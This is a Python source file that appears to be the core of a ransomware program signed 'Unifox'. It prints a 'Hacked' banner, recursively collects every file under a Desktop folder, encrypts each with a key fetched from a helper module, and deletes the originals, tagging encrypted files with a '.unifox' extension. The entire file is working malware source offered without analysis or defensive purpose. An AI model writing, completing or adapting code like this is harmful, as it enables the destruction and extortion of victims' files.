import os
import base64
from pathlib import Path
from sys import stdout
from Get_data import get_keys
from encrypt_setting import *

class colors:
	def __init__(self):
	    self.blue = "\033[94m"
	    self.red = "\033[91m"
	    self.end = "\033[0m"
	    self.green = "\033[92m"
col = colors()

def print_hacked():

	print(col.red+"""

		                /|  /|  ---------------------------
		                ||__||  |                         |
		               /   O O\__   Hacked Hacked Hacked  |
		              /          \   operating system     |
		             /      \     \                       |
		            /   _    \     \ ----------------------
		           /    |\____\     \      ||
		          /     | | | |\____/      ||
		         /       \| | | |/ |     __||
		        /  /  \   -------  |_____| ||
		       /   |   |           |       --|
		       |   |   |           |_____  --|
		       |  |_|_|_|          |     \----
		       /\                  |
		      / /\        |        /
		     / /  |       |       |
		 ___/ /   |       |       |
		|____/    c_c_c_C/ \C_c_c_c


	\t             By: Unifox

	"""+col.end)


def encrypt_executeable():	
	# 경로 설정
	p = Path('/Users/realsung/Desktop')

	# base64 인코딩되어있는 key값 
	key = get_keys()
	list_f = []

	# 확장자들
	extensions = ["*"] # ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']

	for extension in extensions:
		try:
			searche = list(p.glob('**/*.{}'.format(extension)))
		
			for File in searche:
				File = str(File)
				if File.endswith(".unifox"):
					pass
				else:
					#x = x.split("/")[-1]
					list_f.append(File)
					#print(File)
		except OSError:
			print("Permission Error")

	for i in list_f:
		file_name = i.split("/")[-1]
		file_path = i.replace(file_name, "")
		word = col.blue+"Encryption: "+col.end+str(i)
		print(word)
		os.chdir(file_path)
		encrypt(getkey(base64.b64decode(key)), file_name)
		try:
			os.remove(file_name)
		except OSError:
			pass
		
	print(col.green+"\n* Finish Encryption *\n")